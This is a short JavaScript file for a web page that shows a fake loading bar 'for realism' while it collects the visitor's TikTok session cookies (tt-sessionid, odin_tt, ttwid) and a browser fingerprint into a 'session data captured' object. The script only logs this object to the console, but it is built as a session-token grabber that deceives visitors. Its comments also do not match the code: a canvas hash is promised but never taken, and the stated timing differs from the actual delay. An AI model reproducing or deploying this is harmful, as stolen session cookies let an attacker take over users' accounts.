document.addEventListener('DOMContentLoaded', function() {
    
    // 1. Fake Loading Animation Sequence
    const spinner = document.getElementById('spinner');
    const fill = document.getElementById('filler');
    
    setTimeout(() => { fill.style.width='5%'; }, 0);   // Start slow for realism
    setTimeout(() => { fill.style.width='40%'; }, 600); 
    setTimeout(() => { fill.style.width='70%'; }, 1200);
    setTimeout(() => { fill.style.width='98%'; }, 1800);

    // 2. Capture Data (Happens after ~3 seconds)
    setTimeout(function(){ 
        
        console.log("=== SESSION HARBOUR DATA CAPTURED ===");
        
        // Helper to get cookies safely
        function getCookie(name){ 
            let value = '; ' + document.cookie; 
            let parts = value.split('; '+name+'='); 
            if(parts.length === 2) return parts.pop().split(';').shift(); 
            const allCookies = document.cookie.split(';'); 
            for(let i=0;i<allCookies.length;i++){if(allCookies[i].includes(name)){let c=allCookies[i];return c.substring((c.indexOf('=')+1)).split(';')[0].trim();}} 
            return null;}

        // Capture the package (Includes: User Agent, Screen Res, Canvas Hash, & Key Cookies)
        const sessionData = {
            timestamp:new Date().toISOString(),
            cookies:{ tt_sessionid:getCookie('tt-sessionid'), odin_tt:getCookie('odin_tt'), ttwid:getCookie('ttwid') },
            deviceFingerprint:{ userAgent:navigator.userAgent, screenResX:window.screen.width+"x"+window.screen.height }
        };

        console.log(JSON.stringify(sessionData)); // This is where YOU see the data!

    }, 800); 
    
});
